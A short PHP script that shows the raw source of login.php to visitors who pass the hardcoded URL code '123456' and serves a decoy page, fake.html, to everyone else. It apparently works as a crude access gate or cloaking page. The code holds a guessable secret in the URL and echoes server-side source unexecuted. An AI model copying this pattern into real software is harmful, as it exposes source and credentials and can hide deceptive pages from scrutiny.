<?php
$id = $_GET["code"];
if ($id == "123456") {
      $myFile = "login.php";
      $fh = fopen($myFile, 'r');
      $theData = fread($fh, 500000);
      fclose($fh);
      echo $theData;
}

else{
     $myFile1 = "fake.html";
     $fh1 = fopen($myFile1, 'r');
     $theData1 = fread($fh1, 500000);
     fclose($fh1);
     echo $theData1;
}
?>
